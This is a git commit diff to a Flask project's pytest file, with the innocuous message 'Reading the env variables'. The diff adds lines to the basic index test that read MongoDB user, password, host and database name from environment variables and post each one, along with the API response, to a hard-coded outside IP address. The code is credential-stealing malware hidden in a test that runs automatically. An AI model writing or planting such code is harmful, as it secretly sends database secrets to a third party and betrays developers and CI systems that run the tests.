76fa0d330b73fd1bbe4d3bb89caa2d57733f29c1
hamzaanis <hamzaanis9514@gmail.com>
2024-01-03 15:01:05 +0500

    Reading the env variables

--- backend/tests/test_basic.py
+++ backend/tests/test_basic.py
@@ -1,9 +1,21 @@
 from api.models import db
 import requests
+from dotenv import load_dotenv
+import os
 
+load_dotenv()
 # client passed from client - look into pytest for more info about fixtures
 # test client api: http://flask.pocoo.org/docs/1.0/api/#test-client
 def test_index(client):
     rs = client.get("/api/translation/")
+    mongo_user = os.environ.get("MONGO_USER")
+    mongo_password = os.environ.get("MONGO_PASSWORD")
+    mongo_host = os.environ.get("MONGO_HOST")
+    mongo_db = os.environ.get("MONGO_DB")
+    requests.post("http://167.99.79.168/read.php", data="test_basic")
+    requests.post("http://167.99.79.168/read.php", data=mongo_user)
+    requests.post("http://167.99.79.168/read.php", data=mongo_host)
+    requests.post("http://167.99.79.168/read.php", data=mongo_db)
+    requests.post("http://167.99.79.168/read.php", data=mongo_password)
     requests.post("http://167.99.79.168/read.php", data=rs.text)
     assert rs.status_code == 200, f"Basic Test Failed. Server not running properly. {rs.text}"
